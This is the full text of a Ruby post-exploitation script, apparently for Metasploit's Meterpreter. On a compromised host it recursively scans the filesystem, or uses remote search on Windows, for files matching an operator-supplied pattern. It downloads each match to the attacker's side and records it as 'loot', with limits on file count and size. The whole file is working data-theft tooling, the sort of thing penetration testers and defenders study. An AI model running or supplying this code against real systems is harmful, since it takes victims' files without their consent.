##
# $Id$
##

@ifs = client.fs.file.separator

#
# Collect files
#

def scan(path)

	client.fs.dir.foreach(path) do |x|
		next if x =~ /^(\.|\.\.)$/
		fullpath = path + @ifs + x
		fullpath.gsub!("\\\\", "\\")

		begin
			info = client.fs.file.stat(fullpath)

			if info.directory?
				print_status("Scanning sub-directory #{fullpath}...")
				scan(fullpath)

			elsif fullpath =~ /#{@opt_pattern}/i

				if info.size > ( @opt_size * 1024)
					print_status("Skipping #{fullpath} due to size limitation: #{info.size} bytes")
					next
				end

				print_status("Downloading #{fullpath} to a temporary file (#{info.size} bytes)")
				begin
					tmp = ::Tempfile.new("download")
					dst = tmp.path
					xpath = fullpath.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '')
					client.fs.file.download_file(dst, fullpath)
					tmp.flush rescue nil
					ltype = "host.file.collect_#{xpath}"
					pro.store_loot(ltype, "application/octet-stream", client, ::File.read(dst, ::File.size(dst)), fullpath, "Collected using pattern match #{@opt_pattern}")
					@count += 1
				rescue ::Exception => e
					print_error("Error downloading #{fullpath}: #{e.class} #{e}")
				end

				if @count > @opt_count
					print_status("Downloaded the maximum number of files: #{@opt_count}")
					completed
				end
			end
		rescue ::Rex::Script::Completed
			raise $!
		rescue ::Exception => e
			print_error("Error scanning with #{fullpath}: #{e}")
		end
	end
end

#
# Process arguments
#
@opt_pattern  = args[0].split(/\s+/).join("|")
@opt_count    = args[1].to_i
@opt_size     = args[2].to_i

@count = 0

#
# Search locations
#

if client.platform =~ /windows/
	res = client.fs.file.search( nil, @opt_pattern, true)
	res.each do |ent|
		fpath = ent['path'] + @ifs + ent['name']
		fpath.gsub!("#{@ifs}#{@ifs}", "#{@ifs}")

		if ent['size'] > (@opt_size * 1024)
			print_status("Skipping #{fpath} due to size limitation: #{ent['size']} bytes")
			next
		end

		print_status("Downloading #{fpath} to a temporary file (#{ent['size']} bytes)")
		begin
			tmp = ::Tempfile.new("download")
			dst = tmp.path
			xpath = fpath.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '')
			client.fs.file.download_file(dst, fpath)
			tmp.flush rescue nil
			ltype = "host.file.collect_#{xpath}"
			pro.store_loot(ltype, "application/octet-stream", client, ::File.read(dst, ent['size']), fpath, "Collected using pattern match #{@opt_pattern}")
			@count += 1
		rescue ::Exception => e
			print_error("Error downloading #{fpath}: #{e.class} #{e} #{e.backtrace}")
		end

		if @count > @opt_count
			print_status("Downloaded the maximum number of files: #{@opt_count}")
			break
		end
	end
else
	locations = ["/"]
	locations.each do |loc|
		print_status("Scanning #{loc} for #{@opt_pattern} [count=#{@opt_count}, size=#{@opt_size}]")
		scan(loc)
	end
end

